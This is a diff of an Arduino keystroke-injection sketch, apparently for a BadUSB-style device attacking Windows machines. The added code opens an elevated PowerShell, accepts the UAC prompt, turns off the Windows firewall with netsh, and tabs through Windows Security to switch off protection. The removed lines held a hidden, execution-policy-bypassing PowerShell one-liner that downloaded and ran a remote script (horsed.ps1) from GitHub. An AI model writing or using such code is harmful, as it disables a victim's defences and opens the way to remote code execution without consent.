@@ -10,30 +10,84 @@ void loop() {
   keyboard.pressKey(GUI, 'x');  // open up powershell
   keyboard.releaseKey();
   delay(350);
-  keyboard.pressKey('i');
+  keyboard.pressKey('a');
   keyboard.releaseKey();
-  delay(1500);
-
-  keyboard.println("Invoke-WebRequest -Uri https://github.com/P-ict0/horsed/blob/main/france.png?raw=true -OutFile france.png;exit");
+  delay(700);
+  keyboard.pressSpecialKey(LEFTARROW);
+  keyboard.releaseKey();
+  delay(100);
+  keyboard.pressSpecialKey(ENTER);
+  keyboard.releaseKey();
 
   delay(800);
 
-  keyboard.pressKey(GUI, 'r');  // open up powershell
+  keyboard.println("netsh advfirewall set currentprofile state off");
 
-  delay(1500);
+  delay(100);
 
-  keyboard.println("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/P-ict0/horsed/main/horsed.ps1?dl=1; invoke-expression $pl");
+  keyboard.println("exit");
 
-  delay(1500);
+  delay(500);
 
-  keyboard.pressKey(GUI, 'x');  // open up powershell
+  keyboard.pressSpecialKey(CTRL, ESCAPE);
   keyboard.releaseKey();
-  delay(350);
-  keyboard.pressKey('i');
-  keyboard.releaseKey();
-  delay(1500);
+  delay(700);
 
-  keyboard.println("Remove-Item france.png;exit");
+  keyboard.println("seguridad de windows");
+  delay(100);
+  
+  keyboard.pressSpecialKey(ENTER);
+  keyboard.releaseKey();
+  delay(700);
+
+  keyboard.pressSpecialKey(TAB);
+  keyboard.releaseKey();
+  delay(100);
+  keyboard.pressSpecialKey(TAB);
+  keyboard.releaseKey();
+  delay(100);
+  keyboard.pressSpecialKey(TAB);
+  keyboard.releaseKey();
+  delay(100);
+  keyboard.pressSpecialKey(TAB);
+  keyboard.releaseKey();
+  delay(100);
+
+  keyboard.pressSpecialKey(ENTER);
+  keyboard.releaseKey();
+  delay(500);
+
+  keyboard.pressSpecialKey(TAB);
+  keyboard.releaseKey();
+  delay(100);
+  keyboard.pressSpecialKey(TAB);
+  keyboard.releaseKey();
+  delay(100);
+  keyboard.pressSpecialKey(TAB);
+  keyboard.releaseKey();
+  delay(100);
+  keyboard.pressSpecialKey(TAB);
+  keyboard.releaseKey();
+  delay(100);
+
+  keyboard.pressSpecialKey(ENTER);
+  keyboard.releaseKey();
+  delay(700);
+
+  keyboard.pressSpecialKey(SPACEBAR);
+  keyboard.releaseKey();
+  delay(700);
+
+  keyboard.pressSpecialKey(LEFTARROW);
+  keyboard.releaseKey();
+  delay(100);
+  keyboard.pressSpecialKey(ENTER);
+  keyboard.releaseKey();
+
+  delay(500);
+
+  keyboard.pressSpecialKey(ALT, F4);
+  keyboard.releaseKey();
 
   while(1);
 }
